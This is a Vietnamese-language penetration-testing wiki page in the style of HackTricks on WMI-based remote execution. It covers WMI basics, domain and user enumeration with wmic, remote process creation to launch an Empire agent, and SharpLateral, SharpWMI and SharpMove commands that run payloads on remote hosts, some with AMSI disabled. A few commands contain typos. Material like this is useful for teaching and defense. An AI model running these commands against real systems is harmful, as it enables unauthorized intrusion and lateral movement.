# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## Giải thích cách hoạt động

Có thể mở tiến trình trên các host khi đã biết tên người dùng và mật khẩu hoặc hash bằng WMI. Wmiexec thực thi lệnh thông qua WMI, mang lại trải nghiệm shell bán tương tác.

**dcomexec.py:** Bằng cách sử dụng các endpoint DCOM khác nhau, script này cung cấp shell bán tương tác tương tự `wmiexec.py`. Giá trị `-object` được chọn sẽ quyết định endpoint; các object được hỗ trợ gồm `MMC20.Application`, `ShellWindows` và `ShellBrowserWindow`. Object cuối cùng triển khai kỹ thuật Shell Browser Window được nhấn mạnh trong hướng dẫn ban đầu.<sup>[[2]](#references)[[3]](#references)</sup>

## Kiến thức cơ bản về WMI

### Namespace

Được tổ chức theo cấu trúc phân cấp dạng thư mục, container cấp cao nhất của WMI là \root; bên dưới là các thư mục bổ sung, gọi là namespace.<sup>[[1]](#references)</sup>
Lệnh liệt kê namespace:

```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```

Có thể liệt kê các lớp trong một namespace bằng cách sử dụng:

```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```

### **Các lớp**

Việc biết tên lớp WMI, chẳng hạn như win32_process, và namespace chứa lớp đó là điều quan trọng đối với mọi thao tác WMI.
Các lệnh liệt kê những lớp bắt đầu bằng `win32`:

```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```

Cách gọi một lớp:

```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```

### Phương thức

Có thể thực thi các phương thức, tức là một hoặc nhiều hàm có thể thực thi của các lớp WMI.

```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```

## Liệt kê WMI

### Trạng thái dịch vụ WMI

Các lệnh để xác minh dịch vụ WMI có đang hoạt động hay không:

```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```

### Thông tin hệ thống và tiến trình

Thu thập thông tin hệ thống và tiến trình thông qua WMI:

```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```

Đối với kẻ tấn công, WMI là công cụ mạnh mẽ để liệt kê dữ liệu nhạy cảm về hệ thống hoặc miền.<sup>[[1]](#references)</sup>

```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```

Có thể truy vấn WMI từ xa để lấy thông tin cụ thể, chẳng hạn như quản trị viên cục bộ hoặc người dùng đã đăng nhập, nếu xây dựng lệnh cẩn thận.

### **Truy vấn WMI từ xa thủ công**

Có thể âm thầm xác định quản trị viên cục bộ trên máy từ xa và người dùng đã đăng nhập thông qua các truy vấn WMI cụ thể. `wmic` cũng hỗ trợ đọc từ tệp văn bản để thực thi lệnh đồng thời trên nhiều nút.<sup>[[1]](#references)</sup>

Để thực thi từ xa một tiến trình thông qua WMI, chẳng hạn như triển khai Empire agent, sử dụng cấu trúc lệnh sau. Giá trị trả về "0" cho biết lệnh đã thực thi thành công:<sup>[[1]](#references)</sup>

```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```

Quy trình này minh họa khả năng thực thi từ xa và liệt kê hệ thống của WMI, làm nổi bật tính hữu ích của nó trong cả quản trị hệ thống lẫn kiểm thử xâm nhập.

## Công cụ tự động

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):

```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```

- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)

```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):

```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```

- Bạn cũng có thể sử dụng **`wmiexec` của Impacket**.


## References

- [1] [Sử dụng thông tin xác thực để chiếm quyền các máy Windows - Phần 3 (WMI và WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [2] [Fortra Impacket – dcomexec.py](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py)
- [3] [Hướng dẫn dành cho người mới bắt đầu về bộ công cụ Impacket, Phần 1 – Hacking Articles (Internet Archive)](https://web.archive.org/web/20190822180831/https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
{{#include ../../banners/hacktricks-training.md}}
